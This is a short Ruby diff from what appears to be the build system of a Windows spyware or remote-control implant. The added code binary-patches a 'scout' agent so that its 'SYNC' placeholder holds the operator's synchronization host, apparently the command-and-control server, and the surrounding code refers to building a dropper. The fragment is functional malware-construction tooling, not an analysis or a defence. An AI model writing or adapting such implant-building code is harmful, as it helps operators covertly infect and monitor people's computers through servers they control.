@@ -39,6 +39,22 @@ class BuildWindows < Build
       params[:core] = 'scout'
       # invoke the generic patch method with the new params
       super
+
+      patch_file(:file => 'scout') do |content|
+        begin
+          config = JSON.parse(@factory.configs.first.config)
+          # search for the first sync action and take the sync address
+          config['actions'].each do |action|
+            action['subactions'].each do |sub|
+              if sub['action'] == 'synchronize'
+                content.binary_patch 'SYNC'*16, sub['host'].ljust(64, "\x00")
+              end
+            end
+          end
+        rescue
+          raise "Sync marker not found"
+        end
+      end
     end
 
     # calculate the function name for the dropper
